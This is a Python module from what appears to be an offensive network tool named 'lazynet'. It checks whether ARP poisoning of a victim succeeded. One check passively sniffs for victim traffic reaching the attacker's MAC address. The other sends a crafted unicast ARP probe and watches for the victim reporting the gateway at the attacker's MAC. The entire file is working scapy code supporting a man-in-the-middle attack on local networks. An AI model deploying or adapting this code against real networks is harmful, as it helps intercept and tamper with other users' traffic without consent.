"""
Verification functions for ARP poisoning
Two strategies are provided: 
passive and active as fallback if the passive strategy timeouts
"""

import logging
from scapy.all import ARP, Ether, IP
from ..shared.packets import send_frame, sniff_packets
from .helpers import clear_local_arp_entry


logger = logging.getLogger("lazynet")


class VerificationResult:
    """Result of a poisoning check"""

    def __init__(self, success, method, packets_seen=0, detail=""):
        self.success = success
        self.method = method
        self.packets_seen = packets_seen
        self.detail = detail

    def __bool__(self):
        return self.success

    def __repr__(self):
        return (
            f"VerificationResult(success={self.success}, method={self.method}, packets_seen={self.packets_seen}, detail={self.detail})"
        )


def verify(method, target, gateway, attacker_mac, attacker_ip, interface, timeout, verbose=True):
    """ Dispatch to the right verifier based on method """

    if method == "passive":
        return verify_passive(
            target=target,
            attacker_mac=attacker_mac,
            interface=interface,
            timeout=timeout,
            verbose=verbose,
        )

    if method == "active":
        return verify_active(
            target=target,
            gateway=gateway,
            attacker_mac=attacker_mac,
            attacker_ip=attacker_ip,
            interface=interface,
            timeout=timeout,
            verbose=verbose,
        )

    raise ValueError(f"method must be 'passive' or 'active', got {method}")


def verify_passive(target, attacker_mac, interface, timeout, verbose=True):
    """Sniff for victim traffic whose L2 destination is our MAC"""
    if verbose:
        logger.info(f"Passive verification: watching {target.ip} for {timeout:.1f}s ...")

    observed = []

    def handle_packet(packet):
        if Ether not in packet or IP not in packet:
            return
        if packet[IP].src != target.ip:
            return
        if packet[Ether].dst.lower() != attacker_mac.lower():
            return
        observed.append(packet)

    try:
        sniff_packets(
            interface=interface,
            timeout=timeout,
            filter_expression="ip src " + target.ip,
            on_packet=handle_packet,
        )
    except Exception as error:
        return VerificationResult(success=False, method="passive", packets_seen=0, detail=f"Sniff error: {error}")

    count = len(observed)
    if count > 0:
        detail = f"Observed {count} packet(s) from the victim arriving at our MAC."
    else:
        detail = "No victim traffic observed through us during the window."

    return VerificationResult(
        success=(count > 0),
        method="passive",
        packets_seen=count,
        detail=detail,
    )


def verify_active(target, gateway, attacker_mac, attacker_ip,
                  interface, timeout, verbose=True):
    """Send a unicast ARP probe to the victim and check the reply."""
    if verbose:
        logger.info("Active verification: probing %s for %.1fs ...",
                    target.ip, timeout)

    # Build and send the unicast ARP request
    ether = Ether(dst=target.mac, src=attacker_mac)
    arp = ARP(
        op=1, # ARP request
        psrc=attacker_ip,
        pdst=gateway.ip,
        hwdst=target.mac,
    )
    try:
        send_frame(ether / arp, interface)
    except Exception as error:
        return VerificationResult(success=False, method="active", packets_seen=0, detail=f"Could not send probe: {error}")

    # Listen for the victim reply
    replies = []

    def handle_reply(packet):
        if ARP not in packet:
            return
        if packet[ARP].op != 2:
            return
        if packet[ARP].psrc != gateway.ip:
            return
        if packet[ARP].hwsrc.lower() != attacker_mac.lower():
            return
        replies.append(packet)

    try:
        sniff_packets(
            interface=interface,
            timeout=timeout,
            filter_expression="arp",
            on_packet=handle_reply,
        )
    except Exception as error:
        return VerificationResult(
            success=False, method="active", packets_seen=0,
            detail=f"Sniff error: {error}",
        )
    finally:
        # clear our own ARP cache for the gateway
        clear_local_arp_entry(gateway.ip, interface)

    count = len(replies)
    if count > 0:
        detail = (f"Victim reported gateway {gateway.ip} at our MAC ({attacker_mac})")
    else:
        detail = (f"Victim did not report our MAC for gateway {gateway.ip} within {timeout:.1f}s")
    return VerificationResult(success=(count > 0), method="active", packets_seen=count, detail=detail)